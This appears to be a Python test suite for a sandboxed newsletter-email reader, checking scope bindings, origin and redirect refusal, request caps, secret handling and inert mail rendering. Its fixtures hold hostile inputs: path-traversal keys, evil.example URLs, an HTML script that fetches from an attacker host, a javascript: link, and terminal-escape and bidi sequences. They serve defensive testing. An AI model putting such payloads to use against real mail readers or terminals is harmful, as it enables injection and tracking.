"""Offline host-reader and inert mail-view controls; zero provider effects."""
import base64
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
from unittest import mock
import ssl

from knowledge_radar import newsletter_reader as reader
from knowledge_radar.newsletter_intake import NewsletterEmail, NewsletterObjectRead, NewsletterRefusal, RECIPIENT, read_private_receipt

BINDING = reader.NewsletterReaderBinding("a" * 32, "private-newsletter-fixture")
RAW = (b'From: sender@example.org\r\nSubject: Confirm\r\nContent-Type: text/plain\r\n\r\n'
       b'Please confirm https://example.org/confirm?token=PRIVATE_TOKEN\r\n')
MAIL = NewsletterEmail("delivery-one", RECIPIENT, "sender@example.org", "2026-10-13T23:00:00Z", RAW,
                       "cloudflare_email_worker/v1")
KEY = reader.PREFIX + MAIL.delivery_id + ".json"
RAW_KEY = "newsletter-email/v1/raw/" + MAIL.raw_sha256


def receipt():
    value = MAIL.wire()
    value.pop("raw_base64")
    return {**value, "raw_bytes": len(RAW), "raw_key": RAW_KEY,
            "source_semantics": "private_email_not_public_feed", "disposition": "quarantined",
            "sender_authentication": "not_verified", "publication_approved": False}


class Connection:
    def __init__(self, *, status=200, body=b"", headers=None):
        self.status, self.body, self.headers = status, body, headers or {}
        self.requests, self.closed = [], False

    def request(self, *args, **kwargs):
        self.requests.append((args, kwargs))

    def getresponse(self):
        return self

    def getheader(self, name, default=None):
        return self.headers.get(name, default)

    def read(self, size):
        body, self.body = self.body[:size], self.body[size:]
        return body

    def close(self):
        self.closed = True


class ReaderTests(unittest.TestCase):
    def test_binding_and_explicit_paths_cannot_change_host_or_scope(self):
        for account, bucket in (("../escape", BINDING.bucket), (BINDING.account_id, "../../other")):
            with self.assertRaises(NewsletterRefusal):
                reader.NewsletterReaderBinding(account, bucket)
        resolve, transport = mock.Mock(), mock.Mock()
        held = reader.NewsletterR2Reader(BINDING, resolve, transport=transport)
        for request in (NewsletterObjectRead("other-bucket", KEY, 4096),
                        NewsletterObjectRead(BINDING.bucket, "../escape", 4096),
                        NewsletterObjectRead(BINDING.bucket, "https://evil.example/key", 4096),
                        NewsletterObjectRead(BINDING.bucket, KEY + "?token=x", 4096),
                        NewsletterObjectRead(BINDING.bucket, KEY, 4097)):
            with self.assertRaises(NewsletterRefusal):
                held(request)
        resolve.assert_not_called()
        transport.assert_not_called()

    def test_host_reader_import_boundary_preserves_exact_raw(self):
        calls = []
        def transport(binding, operation, key, cap, token):
            calls.append((binding, operation, key, cap))
            self.assertEqual(token, "offline-fixture-only")
            return json.dumps(receipt()).encode() if key == KEY else RAW
        resolver = mock.Mock(return_value="offline-fixture-only")
        held = reader.NewsletterR2Reader(BINDING, resolver, transport=transport)
        self.assertEqual(read_private_receipt(KEY, held, bucket=BINDING.bucket), MAIL)
        self.assertEqual([row[2] for row in calls], [KEY, RAW_KEY])
        self.assertEqual(calls[1][3], len(RAW))
        self.assertEqual(resolver.call_args.args, (reader.KEY_REFERENCE,))

    def test_listing_is_one_bounded_receipt_page_without_bodies_or_cursor_following(self):
        body = {"success": True, "errors": [], "result": [{"key": KEY, "size": 900,
                "custom_metadata": {"secret": "NOT_FOR_DISPLAY"}}],
                "result_info": {"is_truncated": True, "cursor": "NOT_FOLLOWED"}}
        transport = mock.Mock(return_value=json.dumps(body).encode())
        held = reader.NewsletterR2Reader(BINDING, lambda _: "offline-fixture", transport=transport)
        result = held.list_receipts(limit=1)
        self.assertEqual(transport.call_count, 1)
        self.assertEqual(result["next_after"], KEY)
        self.assertNotIn("NOT_FOR_DISPLAY", json.dumps(result))
        self.assertNotIn("NOT_FOLLOWED", json.dumps(result))
        self.assertFalse(result["content_included"])

    def test_listing_refuses_other_prefix_and_malformed_accounting(self):
        for rows in ([{"key": "catalogue/private-secret", "size": 5}],
                     [{"key": KEY, "size": True}], [{"key": KEY, "size": 4097}],
                     [{"key": KEY, "size": 100}] * 2):
            transport = mock.Mock(return_value=json.dumps({"success": True, "errors": [], "result": rows}).encode())
            held = reader.NewsletterR2Reader(BINDING, lambda _: "fixture", transport=transport)
            with self.assertRaises(NewsletterRefusal):
                held.list_receipts()
            self.assertTrue(held.held)

    def test_listing_does_not_invent_complete_when_provider_omits_that_fact(self):
        held = reader.NewsletterR2Reader(BINDING, lambda _: "fixture", transport=lambda *args:
            b'{"success":true,"errors":[],"result":[]}')
        self.assertIsNone(held.list_receipts()["is_truncated"])

    def test_invalid_listing_selection_refuses_before_credentials(self):
        resolver = mock.Mock()
        held = reader.NewsletterR2Reader(BINDING, resolver)
        for kwargs in ({"limit": 21}, {"limit": True}, {"after": "../escape"}):
            with self.assertRaises(NewsletterRefusal):
                held.list_receipts(**kwargs)
        resolver.assert_not_called()

    def test_transport_unknown_holds_session_without_retry(self):
        transport = mock.Mock(side_effect=NewsletterRefusal("newsletter_reader_transport_unknown"))
        held = reader.NewsletterR2Reader(BINDING, lambda _: "fixture", transport=transport)
        for _ in range(2):
            with self.assertRaises(NewsletterRefusal):
                held(NewsletterObjectRead(BINDING.bucket, KEY, 4096))
        self.assertEqual(transport.call_count, 1)

    def test_maximum_three_requests_and_aggregate_byte_reservation(self):
        held = reader.NewsletterR2Reader(BINDING, lambda _: "fixture", transport=lambda *args: b"x")
        for _ in range(3):
            held(NewsletterObjectRead(BINDING.bucket, KEY, 4096))
        with self.assertRaises(NewsletterRefusal):
            held(NewsletterObjectRead(BINDING.bucket, KEY, 4096))
        held = reader.NewsletterR2Reader(BINDING, lambda _: "fixture", transport=lambda *args: b"x")
        held(NewsletterObjectRead(BINDING.bucket, RAW_KEY, 2 * 1024 * 1024))
        with self.assertRaises(NewsletterRefusal):
            held(NewsletterObjectRead(BINDING.bucket, RAW_KEY, 2 * 1024 * 1024))

    def test_http_transport_is_fixed_get_no_redirect_and_no_error_body_disclosure(self):
        connection = Connection(status=302, headers={"location": "https://evil.example/"}, body=b"PRIVATE_PROVIDER_BODY")
        factory = mock.Mock(return_value=connection)
        url = reader._request(BINDING, "get", KEY, 4096)
        with self.assertRaisesRegex(NewsletterRefusal, "provider_refused") as raised:
            reader.bounded_get(url, "offline-fixture", 4096, connection_factory=factory)
        self.assertEqual(len(connection.requests), 1)
        self.assertEqual(connection.requests[0][0][0], "GET")
        self.assertEqual(connection.requests[0][1]["headers"]["Accept-Encoding"], "identity")
        self.assertEqual(factory.call_args.args, ("api.cloudflare.com",))
        self.assertEqual(factory.call_args.kwargs["context"].verify_mode, ssl.CERT_REQUIRED)
        self.assertTrue(factory.call_args.kwargs["context"].check_hostname)
        self.assertTrue(connection.closed)
        self.assertEqual(connection.body, b"PRIVATE_PROVIDER_BODY")
        self.assertNotIn("PRIVATE_PROVIDER_BODY", str(raised.exception))

    def test_http_stream_cap_and_encoding_are_checked_without_trusting_size(self):
        for headers in ({}, {"content-encoding": "gzip"}, {"content-length": "5000"}):
            connection = Connection(body=b"A" * 5000, headers=headers)
            with self.assertRaises(NewsletterRefusal):
                reader.bounded_get(reader._request(BINDING, "get", KEY, 4096), "fixture", 4096,
                                   connection_factory=lambda *args, **kwargs: connection)
            self.assertTrue(connection.closed)

    def test_reader_refuses_unexpected_origin_before_transport(self):
        factory = mock.Mock()
        for url in ("http://api.cloudflare.com/client/v4/accounts/x", "https://evil.example/client/v4/accounts/x",
                    "https://api.cloudflare.com:443/client/v4/accounts/x", "https://api.cloudflare.com/client/v4/accounts/x#secret"):
            with self.assertRaises(NewsletterRefusal):
                reader.bounded_get(url, "fixture", 4096, connection_factory=factory)
        factory.assert_not_called()

    def test_parent_passes_secret_only_on_stdin_and_uses_hard_deadline(self):
        result = subprocess.CompletedProcess([], 0, json.dumps({"body_base64": base64.b64encode(b"data").decode()}).encode(), b"")
        with mock.patch.object(reader.subprocess, "run", return_value=result) as run:
            self.assertEqual(reader.network_read(BINDING, "get", KEY, 4096, "offline-private-value"), b"data")
        arguments, kwargs = run.call_args
        self.assertNotIn("offline-private-value", repr(arguments))
        self.assertNotIn("offline-private-value", repr(kwargs["env"]))
        self.assertEqual(json.loads(kwargs["input"])["token"], "offline-private-value")
        self.assertEqual(kwargs["timeout"], 30)
        self.assertIn("-I", arguments[0])

    def test_parent_timeout_is_sanitized_and_not_retried(self):
        with mock.patch.object(reader.subprocess, "run", side_effect=subprocess.TimeoutExpired("private", 30)) as run:
            with self.assertRaisesRegex(NewsletterRefusal, "transport_unknown"):
                reader.network_read(BINDING, "get", KEY, 4096, "fixture")
            self.assertEqual(run.call_count, 1)

    def test_private_mail_view_preserves_confirmation_tokens_but_never_fetches(self):
        with mock.patch("socket.socket", side_effect=AssertionError("network forbidden")):
            result = reader.private_mail_view(MAIL)
        self.assertEqual(result["manual_links"], ["https://example.org/confirm?token=PRIVATE_TOKEN"])
        self.assertEqual(result["remote_fetches"], 0)
        self.assertFalse(result["automatic_actions"])
        self.assertEqual(result["sender_authentication"], "not_verified")

    def test_html_only_confirmation_is_inert_and_attachments_are_excluded(self):
        raw = (b'Content-Type: multipart/mixed; boundary=x\r\n\r\n--x\r\nContent-Type: text/html\r\n\r\n'
               b'<img src="https://track.example.org/pixel"><script>fetch("https://evil.example/run")</script>'
               b'<a href="https://example.org/confirm?token=PRIVATE&amp;mode=1">Confirm</a>'
               b'<a href="javascript:alert(1)">bad</a><a href="https://127.0.0.1/action">private</a>'
               b'\r\n--x\r\nContent-Type: text/html\r\nContent-Disposition: attachment\r\n\r\n'
               b'<a href="https://attachment.example/secret">hidden</a>\r\n--x--\r\n')
        item = NewsletterEmail("html", RECIPIENT, "sender@example.org", MAIL.received_at, raw)
        result = reader.private_mail_view(item)
        self.assertEqual(result["manual_links"], ["https://example.org/confirm?token=PRIVATE&mode=1"])
        self.assertEqual(result["plain_text"], "")
        self.assertFalse(result["html_rendered"])

    def test_private_view_json_escapes_terminal_commands_and_bidi(self):
        item = NewsletterEmail("terminal", RECIPIENT, "sender@example.org", MAIL.received_at,
                               b'Content-Type: text/plain; charset=utf-8\r\n\r\n\x1b]8;;https://evil.example\x07' + '\u202e'.encode())
        text = json.dumps(reader.private_mail_view(item), ensure_ascii=True)
        self.assertNotIn("\x1b", text)
        self.assertNotIn("\u202e", text)
        self.assertIn("\\u001b", text)

    def test_private_binding_mode_symlink_and_cli_plan(self):
        with tempfile.TemporaryDirectory() as temporary:
            path = Path(temporary) / "binding.json"
            path.write_text(json.dumps({"record_type": BINDING.record_type, "account_id": BINDING.account_id, "bucket": BINDING.bucket}))
            path.chmod(0o600)
            self.assertEqual(reader.load_binding(path), BINDING)
            command = [sys.executable, str(Path(__file__).with_name("read_newsletter_email.py")), "show",
                       "--binding", str(path), "--receipt-key", KEY]
            result = subprocess.run(command, capture_output=True, text=True, timeout=10)
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(json.loads(result.stdout)["network_reads"], 0)
            self.assertNotIn("PRIVATE_TOKEN", result.stdout)
            path.chmod(0o644)
            with self.assertRaises(NewsletterRefusal):
                reader.load_binding(path)
            alias = Path(temporary) / "alias"
            alias.symlink_to(path)
            with self.assertRaises(OSError):
                reader.load_binding(alias)

    def test_private_view_and_network_grants_refuse_before_effects(self):
        with tempfile.TemporaryDirectory() as temporary:
            path = Path(temporary) / "binding.json"
            path.write_text(json.dumps({"record_type": BINDING.record_type, "account_id": BINDING.account_id, "bucket": BINDING.bucket}))
            path.chmod(0o600)
            base = [sys.executable, str(Path(__file__).with_name("read_newsletter_email.py")), "show",
                    "--binding", str(path), "--receipt-key", KEY, "--execute"]
            result = subprocess.run(base, capture_output=True, text=True, timeout=10)
            self.assertIn("private_view_grant_required", result.stdout)
            result = subprocess.run(base + ["--show-private"], capture_output=True, text=True, timeout=10)
            self.assertIn("network_grant_required", result.stdout)


if __name__ == "__main__":
    unittest.main()
